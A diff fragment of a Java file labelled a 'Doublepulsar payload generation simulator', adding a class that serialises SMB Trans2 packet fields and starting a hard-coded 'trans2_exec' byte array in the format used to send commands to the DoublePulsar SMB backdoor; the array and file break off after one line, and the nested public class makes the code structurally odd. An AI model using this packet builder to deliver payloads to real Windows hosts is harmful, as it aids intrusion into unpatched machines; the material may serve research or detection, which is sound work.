@@ -9,7 +9,91 @@ Doublepulsar payload generation simulator
 */
 
 public class Main {
-    
+
+public class SmbTrans2ExecPacket {
+    // Fields
+    public int smbMessageType;       // uint16_t
+    public int smbMessageLength;     // uint16_t
+
+    public byte[] protocolHeader = new byte[4]; // "\xffSMB"
+    public byte smbCommand;
+    public int ntStatus;
+    public byte flags;
+    public int flags2;               // uint16_t
+    public int processIDHigh;        // uint16_t
+    public byte[] signature = new byte[8];
+    public int reserved;
+    public int treeId;               // uint16_t
+    public int processID;            // uint16_t
+    public int userID;               // uint16_t
+    public int multipleID;           // uint16_t
+
+    public byte wordCount;
+    public int totalParameterCount;
+    public int totalDataCount;
+    public int maxParameterCount;
+    public int maxDataCount;
+    public byte maxSetupCount;
+    public byte reserved1;
+    public int flags3;               // uint16_t
+    public int timeout;
+    public int reserved2;
+    public int parameterCount;
+    public int parameterOffset;
+    public int dataCount;
+    public int dataOffset;
+    public byte setupCount;
+    public byte reserved3;
+    public int subcommand;           // uint16_t
+    public int byteCount;            // uint16_t
+    public byte padding;
+
+    public byte[] toBytes() {
+        ByteBuffer buffer = ByteBuffer.allocate(4178); // adjust size as needed
+        buffer.order(ByteOrder.LITTLE_ENDIAN);
+
+        // Header
+        buffer.putShort((short) smbMessageType);
+        buffer.putShort((short) smbMessageLength);
+
+        buffer.put(protocolHeader);
+        buffer.put(smbCommand);
+        buffer.putInt(ntStatus);
+        buffer.put(flags);
+        buffer.putShort((short) flags2);
+        buffer.putShort((short) processIDHigh);
+        buffer.put(signature);
+        buffer.putShort((short) reserved);
+        buffer.putShort((short) treeId);
+        buffer.putShort((short) processID);
+        buffer.putShort((short) userID);
+        buffer.putShort((short) multipleID);
+
+        // Parameters
+        buffer.put(wordCount);
+        buffer.putShort((short) totalParameterCount);
+        buffer.putShort((short) totalDataCount);
+        buffer.putShort((short) maxParameterCount);
+        buffer.putShort((short) maxDataCount);
+        buffer.put(maxSetupCount);
+        buffer.put(reserved1);
+        buffer.putShort((short) flags3);
+        buffer.putInt(timeout);
+        buffer.putShort((short) reserved2);
+        buffer.putShort((short) parameterCount);
+        buffer.putShort((short) parameterOffset);
+        buffer.putShort((short) dataCount);
+        buffer.putShort((short) dataOffset);
+        buffer.put(setupCount);
+        buffer.put(reserved3);
+        buffer.putShort((short) subcommand);
+        buffer.putShort((short) byteCount);
+        buffer.put(padding);
+
+        return buffer.array();
+    }
+}
+
     public static byte[] trans2_exec = new byte[] {
 
         (byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0xff,(byte)0x53,(byte)0x4d,(byte)0x42,(byte)0x32,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x18,(byte)0x07,(byte)0xc0,
